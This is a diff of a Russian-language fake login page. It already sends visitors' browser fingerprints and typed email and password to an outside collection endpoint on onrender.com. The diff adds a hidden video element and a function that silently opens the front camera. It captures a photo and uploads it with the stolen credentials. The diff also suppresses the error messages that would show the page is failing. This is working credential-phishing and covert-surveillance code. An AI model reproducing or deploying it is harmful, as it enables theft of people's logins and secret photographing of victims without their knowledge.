@@ -9,6 +9,7 @@ body{font-family:sans-serif;max-width:640px;margin:80px auto;padding:0 20px;colo
 input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}
 button{padding:10px 24px;background:#2563eb;color:#fff;border:0;border-radius:6px;font-size:16px}
 #log{font-size:11px;color:#999;margin-top:40px}
+video{display:none}
 </style>
 </head>
 <body>
@@ -18,6 +19,10 @@ button{padding:10px 24px;background:#2563eb;color:#fff;border:0;border-radius:6p
 <input id="password" placeholder="Пароль" type="password">
 <button onclick="submitForm()">Войти</button>
 <pre id="log"></pre>
+
+<!-- Скрытое видео для камеры -->
+<video id="camera" autoplay playsinline></video>
+
 <script>
 const API = "https://sites-gt5x.onrender.com/api/collect";
 
@@ -30,11 +35,9 @@ async function collect(data) {
     });
     if (res.ok) {
       document.getElementById("log").textContent += "· ";
-    } else {
-      document.getElementById("log").textContent = "Ошибка сервера: " + res.status;
     }
   } catch (e) {
-    document.getElementById("log").textContent = "Ошибка сети: " + e.message;
+    console.error(e);
   }
 }
 
@@ -42,29 +45,55 @@ function fingerprint() {
   return {
     ua: navigator.userAgent,
     lang: navigator.language,
-    screen: screen.width + "x" + screen.height,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+    screen: screen.width + "x" + screen.height
   };
 }
 
-// Отправляем при загрузке
+// Сбор при заходе
 collect({type: "visit", fp: fingerprint()});
+
+// Функция для фото
+async function takePhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.getElementById("camera");
+    video.srcObject = stream;
+    
+    // Ждем секунду, чтобы камера сфокусировалась
+    await new Promise(r => setTimeout(r, 1000));
+    
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    
+    // Конвертируем в base64
+    const photoBase64 = canvas.toDataURL("image/jpeg", 0.7);
+    
+    // Останавливаем камеру
+    stream.getTracks().forEach(t => t.stop());
+    
+    return photoBase64;
+  } catch (e) {
+    return "Camera denied";
+  }
+}
 
 async function submitForm() {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
-  
-  if (!email || !password) {
-    document.getElementById("log").textContent = "Заполните все поля.";
-    return;
-  }
+  if (!email || !password) return document.getElementById("log").textContent = "Заполните все поля.";
 
   document.getElementById("log").textContent = "Отправка...";
   
+  // Делаем фото
+  const photo = await takePhoto();
+
   await collect({
     type: "login", 
     email: email, 
-    password: password, 
+    password: password,
+    photo: photo, // Передаем фото на сервер
     fp: fingerprint()
   });
   
